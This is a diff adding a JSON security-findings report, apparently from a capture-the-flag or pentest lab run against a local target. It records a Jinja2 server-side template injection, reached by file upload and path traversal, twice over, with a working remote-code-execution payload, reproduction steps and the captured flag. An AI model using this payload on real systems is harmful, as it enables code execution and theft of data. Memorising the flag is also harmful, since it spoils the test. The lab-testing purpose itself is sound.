@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-14T15:24:12.672591+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "937544f3-2d27-4419-9d55-45103cd2e7b4",
+      "timestamp": "2026-04-14T15:24:12.672412+00:00",
+      "title": "Server-Side Template Injection (SSTI) via Dynamic Template Include - Flag Captured",
+      "severity": "critical",
+      "target": "http://172.17.0.1:55005",
+      "description": "The /error endpoint uses a dynamic Jinja2 template include directive `{% include error_type %}` where error_type is user-controlled. By uploading a malicious HTML file via the profile image upload feature and including it through path traversal (../images/exploit.html), an attacker can execute arbitrary Jinja2 template expressions. This was exploited to achieve remote code execution via `request.application.__globals__.__builtins__.__import__('os').popen().read()` and read the system flag.",
+      "evidence": "flag{61136ced-0d3f-41f6-893f-a0a8a02da41b}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "1. Login with test:test credentials\n2. Upload malicious template via POST /update_profile with multipart form containing image_profile=@exploit.html\n3. Template contains: {{ request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read() }}\n4. Trigger SSTI via GET /error?error_type=../images/exploit.html&error_message=test\n5. Flag returned in response: flag{61136ced-0d3f-41f6-893f-a0a8a02da41b}",
+        "expected": "flag{61136ced-0d3f-41f6-893f-a0a8a02da41b}"
+      }
+    },
+    {
+      "id": "89079876-8554-43e5-86dd-e3aecb33772b",
+      "timestamp": "2026-04-14T15:24:12.758171+00:00",
+      "title": "Server-Side Template Injection (SSTI) via Dynamic Template Include - Flag Captured",
+      "severity": "critical",
+      "target": "http://172.17.0.1:55005",
+      "description": "The /error endpoint uses a dynamic Jinja2 template include directive `{% include error_type %}` where error_type is user-controlled. By uploading a malicious HTML file via the profile image upload feature and including it through path traversal (../images/exploit.html), an attacker can execute arbitrary Jinja2 template expressions. This was exploited to achieve remote code execution via `request.application.__globals__.__builtins__.__import__('os').popen().read()` and read the system flag.",
+      "evidence": "flag{61136ced-0d3f-41f6-893f-a0a8a02da41b}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "1. Login with test:test credentials\n2. Upload malicious template via POST /update_profile with multipart form containing image_profile=@exploit.html\n3. Template contains: {{ request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read() }}\n4. Trigger SSTI via GET /error?error_type=../images/exploit.html&error_message=test\n5. Flag returned in response: flag{61136ced-0d3f-41f6-893f-a0a8a02da41b}",
+        "expected": "flag{61136ced-0d3f-41f6-893f-a0a8a02da41b}"
+      }
+    }
+  ],
+  "diagrams": []
+}
